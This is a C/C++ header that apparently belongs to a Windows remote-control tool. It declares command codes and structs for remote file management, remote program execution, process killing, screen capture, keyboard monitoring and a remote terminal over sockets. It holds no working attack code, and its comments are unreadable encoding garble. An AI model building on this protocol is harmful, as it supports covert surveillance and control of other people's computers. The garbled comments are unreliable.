/*
*	��������,��������
*/

#include "resource.h"

//˽�ж���
#define WM_EDITLABLE			WM_USER + 900		//�༭����
#define WM_USERRCLICKPROCESS	WM_USER + 901		//�û����Ҽ�(����)
#define WM_SETMYCURSOR			WM_USER + 902		//������
#define WM_TREESELCHANGED		WM_USER + 907		//Ŀ¼�б�����˫��
#define WM_DIRLEFTRCLICK		WM_USER + 908		//Ŀ¼�б����ӵ���
#define WM_DIRLEFTRENAMEOK		WM_USER + 909		//Ŀ¼�б����Ӹ���
#define WM_DIRRIGHTRCLICK		WM_USER + 910		//Ŀ¼�б����ӵ���
#define WM_DIRRIGHTRENAMEOK		WM_USER + 911		//Ŀ¼�б����Ӹ���
#define WM_INSERTMYITEM			WM_USER + 912		//������Ŀ
#define WM_FILETRANSRCLICK		WM_USER + 916		//�ļ��б��Ҽ���
#define WM_FILE_TRANS			WM_USER + 601		//�ļ�����
#define WM_FILESTATUS			WM_USER + 602		//�ļ�״̬
#define WM_GETSOCKET			WM_USER + 603		//ȡ�׽���
#define WM_CLOSEITEM			WM_USER + 604		//�ͻ��ر�
#define WM_INITSOCKET			WM_USER + 605		//��ʼ���׽���
#define WM_GET_FILE				WM_USER + 606		//ȡ�ļ�����	
#define WM_TRANS_STATE			WM_USER + 607		//�ļ�״̬	
#define WM_TRANS_INFO			WM_USER + 608		//�ļ���Ϣ	

//�����ͻ�
#define CLIENT_FILE				1					//�ͻ��ļ�
#define CLIENT_DIR				2					//�ͻ�Ŀ¼
#define CLIENT_DISK				3					//�ͻ�����

//��������

#define TRAN_DATA_LEN			2048 * 1024			//���ݽ�������

#define CLIENT_DISK_INFO		5001				//ȡ������Ϣ
#define CLIENT_FILE_INFO		5002				//ȡ�ļ���Ϣ
#define CLIENT_DIR_INFO			5003				//ȡĿ¼��Ϣ
#define CLIENT_DIR_LIST			5004				//�о�Ŀ¼
#define CLIENT_FILE_DELETE		5005				//ɾ���ļ�
#define CLIENT_CREATE_DIR		5006				//�½�Ŀ¼
#define CLIENT_RENAME			5007				//�������½�
#define CLIENT_DISK_LIST		5008				//ȡ�����б�
#define CLIENT_EXEC_FILE		5009				//Զ�����г���
#define CLIENT_PROCESS_KILL		5010				//��ֹ�û�����
#define CLIENT_COPY_DIR_LIST	5017				//�ͻ�Ŀ¼�����б�
#define CLIENT_FIND_FILE		5024				//�����ļ�
#define CLIENT_UP_FILE			5025				//�����ļ�
#define CLIENT_DL_FILE			5026				//�����ļ�
#define CLIENT_TRANS_FILE_START	5027				//��ʼ��̨�����ļ�
#define CLIENT_TRANS_FILE_STOP	5028				//ֹͣ��̨�����ļ�

#define NOT_FIND_ANY_FILE		7000				//�Ҳ����κ��ļ�
#define CAN_NOT_OPEN_OBJECE		7001				//�޷���ָ��Ŀ¼
#define INVALID_COMMAND			7002				//��Ч����
#define CAN_NOT_OPEN_FILE		7003				//�޷����ļ�
#define GET_DISK_INFO_FAIL		7004				//ȡ������Ϣʧ��
#define EXEC_FILE_FAIL			7005				//Զ�����г���ʧ��
#define RENAME_FAILE			7015				//����ʧ��
#define CREATE_DIR_FAILE		7016				//����Ŀ¼ʧ��
#define COMMAND_PARAM_ERR		7017				//��������
#define OPEB_REG_KEY_ERR		7018				//�޷���ָ����ֵ
#define CAN_NOT_CREATE_TMP_FILE 7019				//�޷�������ʱ�ļ�

#define TRANS_DATA_ERR			8000				//ͨ�Ŵ���
#define TIMER_FILE_TRANS		60000				//�ļ����䶨ʱ��
#define TIMER_SAVE_TRANS		60001				//�ļ����䶨ʱ��

#define CONN_MAIN				3000				//��������
#define CONN_FILE_MAIN			3001				//��Ҫ����
#define CONN_FRAM				3003				//��Ļ����
#define CONN_FILE_UP			3004				//�ϴ��ļ�
#define CONN_FILE_DL			3005				//�����ļ�
#define CONN_KEY				3006				//���̼��
#define CONN_TLNT				3007				//�����ն�

#define CONN_FILE_MANA_SEND		4001				//�ļ������͹ܵ�
#define CONN_FILE_MANA_RECV		4002				//�ļ�������չܵ�

typedef struct _FILEINFO_
{
	UINT cmd;
	char local[256];
	char remote[256];
	char size[64];
}FILEINFO,*LPFILEINFO;

typedef struct _CPFILEINFO_
{
	char name[256];
	UINT len;
}CPFILEINFO,*LPCPFILEINFO;

typedef struct _SAVEFILEINFO_
{
	char	m_LocalFile[256];
	char	m_LoadWay[20];
	char	m_RemoteFile[256];
	char	m_FilePoint[50];
	char	m_FileLen[50];
	char	m_FileState[50];
}SAVEFILEINFO,*LPSAVEFILEINFO;

typedef struct _MYLISTFILEINFO_
{
	HWND	hWnd;
	UINT	m_FileLen;
	UINT	m_FilePoint;
	BOOL	m_IsExec;
	char	m_LocalFile[256];
	char	m_RemoteFile[256];
}MYLISTFILEINFO,*LPMYLISTFILEINFO;

typedef struct _MYICONINFO_
{
	char m_Ext[5];
	int  m_Index;
}MYICONINFO,*LPMYICONINFO;

typedef struct _DIRINFO_
{
	CFileStatus m_FileStatus;
	int m_FileCount;
	int m_DirCount;
	ULONGLONG m_AllFileSize;
}DIRINFO,*LPDIRINFO;

typedef struct _DISKINFO_
{
	ULONGLONG	FreeBytesAvailable;  
	ULONGLONG	TotalNumberOfBytes;   
	ULONGLONG	TotalNumberOfFreeBytes;
	char		m_Volume[128];
	char		m_FileSys[128];
	int			m_DeviceType;
	char		m_Name[30];
}DISKINFO,*LPDISKINFO;

typedef struct _DIRLIST_
{
	char m_ItemName[256];
	BYTE m_ItemType;
	LONG m_FileLen;
	char m_ModifyTime[20];
}DIRLIST,*LPDIRLIST;

typedef struct _DIRFILELIST_
{
	char m_ItemPath[256];
	char m_ItemSize[20];
	BYTE m_ItemType;
	char m_ModifyTime[20];
}DIRFILELIST,*LPDIRFILELIST;

typedef struct _CLIENTDATA_
{
	char*	m_TransData;
	DWORD	m_TransLen;
	HANDLE  m_WorkEvent;
	UINT	m_Command;
	HANDLE	m_ThreadHandle;
	SOCKET	m_SendSocket;
	SOCKET	m_RecvSocket;
	HWND	hParent;
	BOOL	m_IsWork;
}CLIENTDATA,*LPCLIENTDATA;

typedef struct _FILETHREADINFO_
{
	BOOL	bExit;
	HWND	hWnd;
	SOCKET	soCmd;
	SOCKET	soData;
}FILETHREADINFO,*LPFILETHREADINFO;

void BcdToAsc(unsigned char *BcdStr,unsigned char *AscStr,int BcdStrLen);
void AscToBcd(unsigned char *AscStr,unsigned char *BcdStr,int AscStrLen);

void DlFileExecThread(LPVOID lPvoid);
void UpFileExecThread(LPVOID lPvoid);
void TransBagThread(LPVOID lPvoid);

BOOL SendData(SOCKET s, char *data, int len);
BOOL RecvData(SOCKET s, char *data, int len);
BOOL SendBag(SOCKET s,char *Data,DWORD &len,UINT &command);
BOOL ReadBag(SOCKET s,char *Data,DWORD &len,UINT &command);
BOOL ProcessOneTrans(LPCLIENTDATA pData);



